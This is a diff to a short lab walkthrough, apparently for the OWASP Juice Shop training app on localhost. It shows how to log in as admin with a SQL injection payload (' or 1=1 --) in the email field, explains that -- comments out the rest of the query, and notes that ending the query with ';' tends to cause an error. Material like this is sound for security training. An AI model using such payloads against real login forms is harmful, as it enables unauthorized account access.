@@ -413,11 +413,13 @@ http://127.0.0.1:3000/#/contact
 
 # Injection
 ## Login Admin
-Go to login page
-Email: `' or 1=1;`  
-Password: `test`
+Go to login page  
+  - Email: `' or 1=1;`  
+  - Password: `test`
 
-Note: Works with email `' or 1=1 --` "--" is used to comment out the remaining SQL Query
+Note: Works with email `' or 1=1 --`  
+`--` is used to comment out the remaining SQL Query
+Finishing the query with `;` will most likely end up throwing an error
 
 Logged in found email address
     
